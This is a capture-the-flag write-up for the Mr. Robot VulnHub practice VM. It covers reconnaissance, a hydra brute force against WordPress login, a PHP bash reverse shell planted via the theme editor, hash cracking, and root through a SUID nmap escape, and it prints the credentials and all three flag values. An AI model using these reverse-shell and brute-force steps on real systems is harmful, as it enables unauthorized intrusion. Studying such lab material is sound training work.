# Mr. Robot VulnHub VM Writeup 🕵️‍♂️

> **Author:** Your Name • **Date:** 2025-06-30  
> **VM:** `Mr. Robot` (Beginner–Intermediate)

---

## Description

> This VM is based on the show *Mr. Robot*. There are **three keys** hidden in different locations, each progressively more challenging to find. No advanced exploitation or reverse engineering is required.

---

## Table of Contents

1. [Reconnaissance](#reconnaissance-️)  
2. [Directory Enumeration](#directory-enumeration-️)  
3. [Finding Key #1 🔑](#finding-key-1-️)  
4. [WordPress Enumeration](#wordpress-enumeration-️)  
5. [Brute‑forcing Credentials](#brute‑forcing-credentials-️)  
6. [Obtaining a Reverse Shell ⚙️](#obtaining-a-reverse-shell-️)  
7. [Privilege Escalation & Key #2 🔑](#privilege-escalation--key-2-️)  
8. [Root Shell via `nmap`](#root-shell-via-nmap-️)  
9. [Retrieving Key #3 🔑](#retrieving-key-3-️)  
10. [Conclusion](#conclusion-️)  

---

## Reconnaissance 📝

```bash
$ nmap -sV -oN nmap_initial.txt 10.0.2.5
Starting Nmap 7.95 at 2025-06-30 09:44 UTC
PORT    STATE  SERVICE VERSION
22/tcp  closed ssh
80/tcp  open   http    Apache httpd
443/tcp open   ssl/http Apache httpd
````

> *Note: SSH is closed, so initial access will be via HTTP (ports 80/443).*

---

## Directory Enumeration 🔍

```bash
$ gobuster dir \
    -u http://10.0.2.5 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -t 100 -x php,html,txt,json,zip -e -r
```

Key findings:

* `/robots.txt` → reveals `fsocity.dic` & `key-1-of-3.txt`
* WordPress directories and login pages present

---

## Finding Key #1 🔑

1. **Fetch `robots.txt`:**

   ```bash
   $ curl http://10.0.2.5/robots.txt
   User-agent: *
   fsocity.dic
   key-1-of-3.txt
   ```
2. **Download the key:**

   ```bash
   $ curl http://10.0.2.5/key-1-of-3.txt -o key-1-of-3.txt
   $ cat key-1-of-3.txt
   073403c8a58a1f80d943455fb30724b9
   ```

> *Key #1 obtained: `073403c8a58a1f80d943455fb30724b9`*

---

## WordPress Enumeration 🐘

```bash
$ wpscan --url http://10.0.2.5 \
    --enumerate u,vp,vt,cb,dbe \
    --disable-tls-checks --no-update
```

* **WP Version:** 4.3.1 (old/insecure)
* **Theme:** `twentyfifteen` (outdated)
* **XML-RPC** & **WP-Cron** enabled

> *No vulnerable plugins or leaks yet, but weak credentials may be possible via brute force.*

---

## Brute‑forcing Credentials 🔑

Using the `fsocity.dic` wordlist against `/wp-login.php`:

```bash
$ hydra -l elliot -P fsocity.dic.uniq \
    10.0.2.5 http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=ERROR"
```

> **Success:**
> `elliot:ER28-0652`

> *👀 I guessed elliot as the username hahaha*

---

## Obtaining a Reverse Shell ⚙️

1. **Edit `header.php`** via WP Theme Editor:

   ```php
   <?php
   exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1'");
   ?>
   ```

2. **Activate & visit** `http://10.0.2.5/nothing` to trigger the payload.

3. **Listener:**

   ```bash
   $ nc -lnvp 4444
   ```

```text
connect to [10.0.2.15] from 10.0.2.5
bash: no job control in this shell
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

> *We’re now the `daemon` user.*

---

## Privilege Escalation & Key #2 🛡️

1. **Explore home directory:**

   ```bash
   daemon@...$ cd /home/robot
   daemon@...$ ls
   key-2-of-3.txt  password.raw-md5
   ```

2. **View MD5 hash & crack:**

   ```bash
   $ cat password.raw-md5
   robot:c3fcd3d76192e4007dfb496cca67e13b
   ```

   * *Cracked via CrackStation →* `abcdefghijklmnopqrstuvwxyz`

3. **Spawn TTY & `su` to `robot`:**

   ```bash
   $ python3 -c 'import pty; pty.spawn("/bin/bash")'
   $ su robot
   Password: abcdefghijklmnopqrstuvwxyz
   $ cat key-2-of-3.txt
   822c73956184f694993bede3eb39f959
   ```

> *Key #2 obtained: `822c73956184f694993bede3eb39f959`*

---

## Root Shell via `nmap` 🚀

1. **Check SUID binaries:**

   ```bash
   $ find / -type f -perm -4000 -user root 2>/dev/null
   /usr/local/bin/nmap
   ```

2. **Launch interactive `nmap`:**

   ```bash
   $ nmap --interactive
   ```

3. **Drop to shell:**

   ```text
   nmap> !sh
   # whoami
   root
   # cd /root
   # ls
   key-3-of-3.txt
   ```

> *Root shell achieved!*

---

## Retrieving Key #3 🔑

```bash
# cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

> **Key #3 obtained:** `04787ddef27c3dee1ee161b21670b4e4`

---

## Conclusion 🎯

* **Keys Found:**

  1. `073403c8a58a1f80d943455fb30724b9`
  2. `822c73956184f694993bede3eb39f959`
  3. `04787ddef27c3dee1ee161b21670b4e4`

* **Takeaways:**

  * Always check `robots.txt` for hidden endpoints.
  * Outdated WordPress core/themes can lead to low-hanging exploits.
  * Clever use of SUID binaries (e.g., `nmap`) can give you root.

> Have a good day!

